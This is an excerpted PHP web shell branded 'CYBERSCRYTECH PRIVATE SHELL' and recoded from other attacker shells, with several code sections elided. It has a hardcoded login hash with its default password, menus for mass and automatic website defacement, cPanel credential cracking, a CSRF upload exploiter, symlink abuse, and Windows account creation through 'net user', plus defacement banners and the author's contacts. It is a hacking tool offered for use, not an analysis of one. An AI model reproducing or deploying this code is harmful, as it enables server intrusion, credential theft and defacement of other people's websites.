<?php
$auth_pass = "594127fddc54c47000fc753f0f7d030f"; // default: cybers.cry
session_start();
error_reporting(0);
set_time_limit(0);
...
<header>
<center><img src="http://imageshack.com/a/img922/4387/CCWUkE.png" width=500 height=500></img></center>
</header>
<form method="post">
...
ECHO "<BR>";
echo "<center><font size='20px' color='lime'>CYBERSCRYTECH PRIVATE SHELL</font>";
echo "<br>";
...
echo "&nbsp;<a href='?' style='border:2px solid lime;width:80px;padding:0px 8px 0px 8px;'>H O M E</a>&nbsp;<a href='?shell&do=kill' style='border:2px solid lime;width:80px;padding:0px 8px 0px 8px;'>K I L L </a>&nbsp;<a href='?byee&do=logout' style='color:red;border:2px solid lime;width:80px;padding:0px 8px 0px 8px;'>L O G O U T</a>";
echo "</td></table>";
echo "<div id='menu'>";
echo "<hr color='black'>";
echo "<hr color='black'>";
...
echo "<li> <a href='?dir=$dir&do=defacerid'>Defacer.id</a> </li><br><br>";
...
echo "<li> <a href='?dir=$dir&do=cpftp_auto'>Cpanel/Ftp Auto Deface</a></li><br><br>";
...
echo "<li> <a href='?dir=$dir&do=hash'>Hash Generate</a> </li><br><br>";
...
echo '<form action="?dir=$dir&do=logout" method="post">';
    ...
    echo '<center>Gue ganteng ya , napa ? ga suka ??? :v <br> - CYBERSCRYTECH -</center>';
} elseif($_GET['do'] == 'contact') {
	echo "<center><br><font size='6'>--=}{  Contact Me  }{=--</font>
	<table><td style='background-color: black;text-align:center;border: 0px lime dotted;width:500px;height:50px;'>
	<font color='pink'>Kurniawanpuji1@gmail.com <br> <a href='https://www.facebook.com/cyberscry.id' target='_blank'>Facebook click here</a>
 | <a href='https://www.shafou.com' target='_blank'>Contact me click here</a></font><br></tr></td></table></center>";
...
if($_POST['username'] and $_POST['password']){
        ...
        echo "<p align='center' dir='ltr'><font size='2'>Coded By : Mauritania Attacker, &amp; Recoded by CYBERSCRYTECH</font></p>";

} elseif($_GET['do'] == 'csrfup')
{	
echo '<html>
<center><h1 style="font-size:33px;">CSRF Exploiter By IndoXPloit<br>Recoded by CYBERSCRYTECH</h1><br><br>
...
<INPUT class=inputzbut type=submit value=setting name=send>
	...
	elseif($_POST['mass'] == 'massdeface') {
		...
		<textarea name='script' style='width: 450px; height: 200px;'>Hacked By CYBERSCRYTECH </textarea><br>
...
echo "<center><form method='post'>
		<u>Defacer</u>: <br>
		<input type='text' name='hekel' size='50' value='CYBERSCRY'><br>
		<u>Team</u>: <br>
		<input type='text' name='tim' size='50' value='Hacker Patah Hati'><br>
		<u>Domains</u>: <br>
...
<?php
	...
	if($_POST['hajar']) {
		...
		Set User & Pass: <br>
		<input type='text' name='user_baru' value='cyberscry' placeholder='user_baru'><br>
		<input type='text' name='pass_baru' value='cyberscry' placeholder='pass_baru'><br>
	...
	if($_POST['crack']) {
		...
		if($i == 0) {
			...
			echo "<br>sukses nyolong ".$i." Cpanel by <font color=lime>CYBERSCRYTECH PRIVATE SHELL.</font>";
		}
	} else {
		echo "<center>
		<form method='post'>
	...
	if($_POST['crack']) {
		...
		if($i == 0) {
			...
			echo "<br>sukses deface ".$i." Cpanel by <font color=lime>CYBERSCRYTECH PRIVATE SHELL</font>";
		}
	} else {
		echo "<center>
		<form method='post'>
	...
	if($_POST['hajar']) {
		...
		<input type='text' size='50' name='config_dir' value='$dir'><br><br>
		Set Title: <br>
		<input type='text' name='new_title' value='Hacked by CYBERSCRYTECH' placeholder='New Title'><br><br>
...
echo "<br><br><center><h1>Symlink By NoName Shell Recoded By CYBERSCRYTECH</h1></center><br><br><center><div class=content>";
...
echo "</center></table>";   
	...
	if($_POST['auto_deface_wp']) {
		...
		<input type='text' name='script' height='10' size='50' placeholder='Hacked by CYBERSCRYTECH' required><br>
...
echo '<textarea cols=10 rows=10 class="inputz" readonly>'.$codi.'</textarea></center><BR><BR>';
	...
	if($_POST['auto_deface_wp']) {
		...
		<form method='post'>
		Link Config: <br>
		<textarea name='link' placeholder='http://target.com/cry_config/user-config.txt' style='width: 450px; height:250px;'></textarea><br>
		<input type='text' name='script' height='10' size='50' placeholder='Hacked by CYBERSCRYTECH' required><br>
		<input type='submit' style='width: 450px;' name='auto_deface_wp' value='Hajar!!'>
		</form></center>";
	}
...
";
	...
	if(strtolower(substr(PHP_OS, 0, 3)) === 'win') {
		if($_POST['create']) {
			...
			if($_POST['opsi'] == '1') {
				...
				if(preg_match("/$user/", exe("net user"))) {
					echo "[change password: <font color=lime>CYBERSCRYTECH</font>] -> ";
					if($cek) {
						echo "<font color=lime>Berhasil</font>";
					} else {
						echo "<font color=red>Gagal</font>";
	...
	echo "<center>Copyright &copy; ".date("Y")." - <a href='http://jembudparanoit.blogspot.com' target='_blank'><font color=yello>CYBERSCRYTECH</font></a></center>";
	echo "<center><font color='red'>Recoded IndoXploit Shell - NoName Shell - By CYBERSCRYTECH - thanks to ALL MEMBER HACKER PATAH HATI - special thanks to Rinto AR";
	}
?>
</html>
